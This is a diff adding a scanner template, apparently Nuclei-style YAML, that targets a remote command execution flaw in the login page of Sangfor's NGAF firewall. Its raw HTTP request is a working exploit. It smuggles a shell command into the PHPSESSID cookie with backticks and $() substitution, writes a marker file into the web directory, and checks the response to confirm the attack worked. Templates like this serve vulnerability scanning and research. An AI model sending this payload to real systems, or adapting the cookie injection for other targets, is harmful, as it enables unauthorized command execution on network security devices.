@@ -1,0 +1,19 @@
+id: poc-na04gancdww0bbhp
+info:
+  name: 深信服下一代防火墙NGAF login远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/na04gancdww0bbhp'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: na04gancdww0bbhp
+    fofa: 暂无
+http:
+- raw:
+  - "POST /cgi-bin/login.cgi HTTP/1.1\n\nConnection: close\n\nContent-Type: Application/X-www-Form\n\nCookie: PHPSESSID=`$(echo 156828301~ > /fwlib/sys/virus/webui/svpn_html/qwer.txt)`;\n\nAccept-Encoding: gzip\n\n\n\n {\"opr\":\"login\", \"data\":{\"user\": \"watchTowr\" , \"pwd\": \"watchTowr\" , \"vericode\": \"EINW\" , \"privacy_enable\": \"0\"}}\n\n# 响应代码特征\n200\n\n# 响应内容特征\nsuccess\n\n# 上传文件定位\n/svpn_html/qwer.txt"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
